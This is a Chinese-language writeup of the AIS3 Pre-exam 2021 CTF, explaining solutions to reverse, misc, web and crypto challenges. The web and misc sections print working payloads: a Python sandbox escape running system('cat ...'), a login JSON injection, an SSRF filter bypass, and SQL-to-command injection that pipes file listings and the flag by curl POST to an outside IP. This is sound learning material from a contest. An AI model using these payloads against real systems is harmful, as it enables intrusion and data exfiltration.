---
tags: writeup
---
# AIS3 Pre-exam CTF 2021 writeup
[TOC]
## Welcome
### Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi
- 我就爛，這題我直接用硬爆的 owo
    - 密碼: 2025830455298
- 硬爆的過程有發現一個快速輸入的方法，就是複製已經對的內容w

## Reverse
### 🐰 Peekora 🥒
- 一開始不太懂 pickle 是啥後來查了一下了解了
- 直接開啟 plk 檔會看到一堆 pickle opcode
- 用 python3 -m pickletools flag_checker.pkl -a 可以看到清楚的 opcode 順序以及解釋
- 找 `__eq__` 就會發現很多都是用你 input 的 flag 的某個字元去跟 unicode 做比較，所以只要記住 index 跟 unicode 最後再組起來就好了
    - 不過有些地方是先存 input[index] 到 mem 再取出來比較，這個就要往上翻看他是 put 哪個 index 進來
    - 最後的 `__eq__` 反過來得w
- 大概掃過一遍就會發現
    ```
    6 A
    9 j
    11 p
    14 j
    5 d
    10 z
    12 h
    13 I
    8 w
    7 m
    ```
- 組起來放到 `AIS3{}` 裡面就是 flag 了

### COLORS
- js 混淆的題目，總之先看那個 encode.js
- 發現裡面有要輸入 ArrowDown,ArrowRight,b,a 直接先試上上下下左右左右ba 結果好像就對了w
- 看一看 code 會發現似乎 input 會加密成 output ，然後移開始解開 input 的時候 output 顯示的就是 flag 加密後的結果，所以只要把加密反過來就可以了
- flag 加密後再用 base encode 會變成 `NDBCMjBnMzBpNTFKNjA2MDFcMzB3NDAxMzBBNDFqNDBcNDExMzBnNzB1MzBpMTBrMzBsNDA3NjB4NTBpNTBYMTBLMTBJNDBoNTBYMDBLNDFpNTFsNzA2NzBmNDBvMTA2NTA1NzBLMTFuNTE4NzA3NDFCNTAtMTE4NDB3MzFhMTByNDF6NzBLMzA9MjA9MTA9`
    - base64 decode 會變成 `40B20g30i51J60601\30w40130A41j40\41130g70u30i10k30l40760x50i50X10K10I40h50X00K41i51l70670f40o10650570K11n51870741B50-11840w31a10r41z70K30=20=10=`
- 看加密 code(_0xce93 這個 function) 會發現步驟是:
    1. 將字元轉成 charCode，然後轉成字串(二進位)並補到 8 位元，並把所有結果串接起來
    2. 將結果補到 10 的倍數
    3. 將結果以 10 個字元一組，切分開來並轉成數字(將二進位編號為0~9 由低到高)
    4. 每組數字產生出三個字元最後串接起來
        1. 6~8 位的二進位
        2. 9 位的二進位
        3. `"AlS3{BasE64_i5+b0rNIng~\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}"[0~5 位的二進位]`
- 轉換出 flag 的 code
    ```python=
    data = ['40B', '20g', '30i', '51J', '606', '01\\', '30w', '401', '30A', '41j', '40\\', '411', '30g', '70u', '30i', '10k', '30l', '407', '60x', '50i', '50X', '10K',
            '10I', '40h', '50X', '00K', '41i', '51l', '706', '70f', '40o', '106', '505', '70K', '11n', '518', '707', '41B', '50-', '118', '40w', '31a', '10r', '41z', '70K']
    fake = "AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}"
    flag = ""
    for d in data:
        num = 0
        num += int(d[0]) << 6
        num += int(d[1]) << 9
        num += fake.index(d[2])
        flag += "{0:010b}".format(num)
    flag = ''.join([chr(int(num, 2)) for num in [flag[i:i+8]
                                                 for i in range(0, len(flag), 8)]])
    print(flag)

    ```
## Misc
### Microcheese
- 原本以為認真玩遊戲就會拿到 flag 結果翻一翻 code 發現必輸，只好認真找哪裡可以 cheese
- 後來發現這個遊戲有瑕疵啊，在遊玩時判斷玩家要執行什麼動作那裡，竟然沒有過濾掉其他選項，導致只要輸入 0,1,2 之外的就會讓 AI 一直執行動作
- 於是就讓 AI 一直執行動作，到剩下一樁石頭一次全部撿完就贏了

### Blind
- 一開始我看到 docker 還以為要 build 起來，結果原來有網址w
- 翻原始碼會看到我們其實就是直接輸入 syscall 的參數
- 再看下面一點會發現讓 flag 出不來的原因是 close(1)
    - close(1) 把 stdout 關閉了
    - 讓 stderr(2) 取代 1 就可以了
- 故輸入 `32 2 0 0` or `33 2 1 0`
    - 32 是 dup 會把第一個參數複製到沒在使用的最低位 <- 1 close 了所以是 1
    - 33 是 dup2 會把第一個參數複製到第二個參數


### [震撼彈] AIS3 官網疑遭駭！
- 看到 pcap 直接用 wireshark 打開來看
- 看一看發現大部分都是 `GET http://magic.ais3.org:8100/index.php?page=bHMgLg%3d`
    - 把 `bHMgLg=` 拿去 base64 decode 會發現是 `ls .`
    - 但回應都是正常的網頁w
- 從 file>export object>http 裡會發現有一條特別奇怪
    - 是 `GET http://magic.ais3.org:8100/Index.php?page=%3DogLgMHb` 
    - 而且看回應應該是執行了 `ls .`
    - 可以看出 `=ogLgMHb` 是 `bHMgLg=` 倒過來 (?)
- 於是送送看 `GET http://magic.ais3.org:8100/Index.php?page=%3DogLgMHb`
    - 發現 DNS 解析出來的 ip 與 pcap 中的不同
    - 於是在 /etc/hosts 輸入 `10.153.11.126 magic.ais3.org`
    - 再送一次就成功出現 Index.php index.php 了
- 知道可以傳送指令後於是先懷疑根目錄，送一下 `http://magic.ais3.org:8100/Index.php?page===wLgMHb`
    - `=wLgMHb` 是 `ls /` base64 encode 之後再反過來
    - 送完會發現根目錄下有 flag_c603222fc7a23ee4ae2d59c8eb2ba84d 
- 於是傳送指令 `cat /flag_c603222fc7a23ee4ae2d59c8eb2ba84d ` 拿取 flag
    - payload: `http://magic.ais3.org:8100/Index.php?page=kRDOhJmMiVGOjlTNkJTZhRTZlNjMhdzYmJjMyMDM2M2XnFGbm9CI0F2Y`

### Cat Slayer | Online Edition
- 寫了一個半自動腳本幫忙打貓咪練等
    ```python=
    import socket
    from time import time
    from pow import proofofwork
    import re


    class game_client:
        s: socket.socket
        hp = 0
        atk = 0
        defense = 0
        money = 0
        connected = True

        def __init__(self):
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect(("quiz.ais3.org", 22222))

        def send(self, s: str = '') -> str:
            if self.connected:
                # print("send: " + s)
                self.s.send((s+'\n').encode())
                return self.recv()

        def recv(self) -> str:
            outdata = self.s.recv(1024).decode()
            # print("recv: "+outdata, "")
            if len(outdata) == 0 or outdata == "timeout":
                self.connected = False
            return outdata

        def login(self, name: str, token: str):
            self.send(str(proofofwork(self.recv().split(
                "256('")[1].split("' ")[0])[0]))
            self.send()
            self.send(name)
            self.send(token)
            self.send()

        def status(self):

            groups = re.search(
                r'HP: (\d*)\sAttack: (\d*)\sDefense: (\d*)\sMoney: (\d*)', self.send('S'))
            self.hp = int(groups.group(1))
            self.atk = int(groups.group(2))
            self.defense = int(groups.group(3))
            self.money = int(groups.group(4))
            self.send()

        def fight(self, level: str, times: int):
            self.send("f")
            self.send(level)
            for _ in range(times-1):
                self.send("y")
            self.send("n")

        def buy(self, thing: str, times: str):
            self.send("b")
            self.send(thing)
            self.send(times)
            self.send("q")


    if __name__ == "__main__":
        name = "takotachi2"
        token = "2b0e02c046e00398e44b346abcc465d7"
        client = game_client()
        client.login(name, token)
        client.status()
        while True:
            print("hp: " + str(client.hp))
            print("atk: " + str(client.atk))
            print("dfs: "+str(client.defense))
            print("money: "+str(client.money))
            input_s = input("input(f,b,q): ")
            if input_s == "f":
                level = input("level: ")
                times = int(input("times: "))
                client.fight(level, times)
            elif input_s == "b":
                thing = input("thing(h,a,d):")
                times = input("times: ")
                client.buy(thing, times)
            elif input_s == "q":
                client.send("q")
                client.s.close()
                break
            if not client.connected:
                client = game_client()
                client.login(name, token)
            client.status()

    ```
- 看原始碼會發現要脫出沙盒
- 雖然看出題者說大概不轉生 4 等就可以拿到 flag
    - 但是我很爛所以轉生+練到 11 級才拿到
- 最後的 payload `[].class.mro[-1].subclasses()[132].init.globals['system']('cat /secr3t_flag_meow_meow')`

## Web
### ⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ
- 這題一開始先看他的 source 會發現
    1. login 的時候是將原先預設好的字串用 % 做處理然後再將字串存到 session 裡
    2. 然後在 / 會將 session 裡面的資料經過 `JSON.loads()` 轉成 dist 再進行驗證
    3. 驗證用戶密碼的方式是直接調用 python dist 的 get method  如果在這個 dist 沒找到直接回 None
    4. showflag == True 且 username != 'guest' 就可以拿到 flag
- 從上面發現可看出可以從 login 那裡注入覆蓋 field 的 payload
    - username 要除了 guest 與 admin 之外的
    - password 要是 null (python 轉換過去會變 None)
    - showflag 要是 true
- 可建構出 payload
    - username: `a","showflag": true,"":"`
    - password: `","password":null,"":"`
- 這樣就拿到 flag ㄌ owob


### HaaS
- 一開始進去是 /haas 不能用 GET method 於是嘗試去 / 看看有什麼
- 看到輸入框，先嘗試他給的範例 url ，理解要送哪些 data
    - url
    - status
- 再亂輸入的過程中，會發現 `http://127.0.0.1` 會彈出 don't attack server
    - 看來怪怪的，感覺就是要打 localhost ㄌ 
- 嘗試 bypass
    - 參考 https://github.com/w181496/Web-CTF-Cheatsheet#本地利用
    - 試到 `127.00000.00000.0001` 就發現可以了
    - 但內容只有 alive (因為在網站上送出的 status 是 200)
- 想到在亂試的時候 status 不相同的話會跑出網頁內容
- 於是傳送 `POST http://quiz.ais3.org:7122/haas`
    - data
        - url: `http://127.00000.00000.0001`
- 就拿到 flag ㄌ

### 【5/22 重要公告】
- 看他送的 request 會發現裡面有 module=modules/api (調用其他 php)
    - 直接用 http://quiz.ais3.org:8001/?module=php://filter/convert.base64-encode/resource=modules/api 將 modules/api.php 的源碼讀出
    ```php=
    <?php
        header('Content-Type: application/json');

        include "config.php";
        $db = new SQLite3(SQLITE_DB_PATH);

        if (isset($_GET['id'])) {
            $data = $db->querySingle("SELECT name, host, port FROM challenges WHERE id=${_GET['id']}", true);
            $host = str_replace(' ', '', $data['host']);
            $port = (int) $data['port'];
            $data['alive'] = strstr(shell_exec("timeout 1 nc -vz '$host' $port 2>&1"), "succeeded") !== FALSE;
            echo json_encode($data);
        } else {
            $json_resp = [];
            $query_res = $db->query("SELECT * FROM challenges");
            while ($row = $query_res->fetchArray(SQLITE3_ASSOC)) $json_resp[] = $row;
            echo json_encode($json_resp);
        }
    ```
- 發現在使用 id 找資料時可以 sql injection
    - 在 id 找不到時，用 union select 可以替換資料
    - 例`id=0 union select 'a', 'a', 'a'` 會讓 name, host, port 都是 a
- 更改 host 的內容有機會執行自定義的指令
    - 但是有過濾掉空格，找到的解法是利用 ${IFS} 替代空格
    - 有試過 reverse shell 但我功力太弱都沒有成功
- 最後利用 curl 發 POST 到自己的電腦並用 nc listen 
    - 不用 GET 的原因是因為那時候試 GET 的時候發現只會傳過來一行，不能 ls QQ
    - 先發過去 ls `id=9 UNION SELECT 'a',"0.0.0.0';ls${IFS}/|curl${IFS}-X${IFS}POST${IFS}--data-binary${IFS}@-${IFS}http://10.153.2.250'",'80'`
    - 會發現根目錄有 `flag_81c015863174cd0c14034cc60767c7f5`
    - 發過去 cat /flag_81c015863174cd0c14034cc60767c7f5 ``id=9 UNION SELECT 'a',"0.0.0.0';cat${IFS}/flag_81c015863174cd0c14034cc60767c7f5|curl${IFS}-X${IFS}POST${IFS}--data-binary${IFS}@-${IFS}http://10.153.2.250'",'80'`` 取得 flag

## Crypto
### Microchip
- 照他寫的 code 直接反推
    - 後來發現好像只要改一點 QQ
- 反著寫的 code
    ```python=
    def gen_keys(id: int):
        keys = list()
        temp = id
        for i in range(4):
            keys.append(temp % 96)
            temp = int(temp / 96)
        return keys


    encode = open("output.txt", "r").read().strip()

    encode_list = []
    count = 0
    tmp = []
    for c in encode:
        count += 1
        tmp.append(ord(c)-32)
        if count % 4 == 0:
            tmp.reverse()
            encode_list.append(tmp)
            tmp = []

    for i in range(96*96*96*96):
        keys = gen_keys(i)
        count = 0
        ans = ""
        for encode_block in encode_list:
            for encode_char in encode_block:
                ans += chr(((96+encode_char - keys[count % 4]) % 96)+32)
                count += 1
        print(ans)

    ```
- 然後其實這裡可以不用一個一個試，可以用 AIS3 這四個字找出 id ，但是我懶所以讓他全部跑一遍w
- 跑到出現 AIS3 開頭就是對得 flag


****
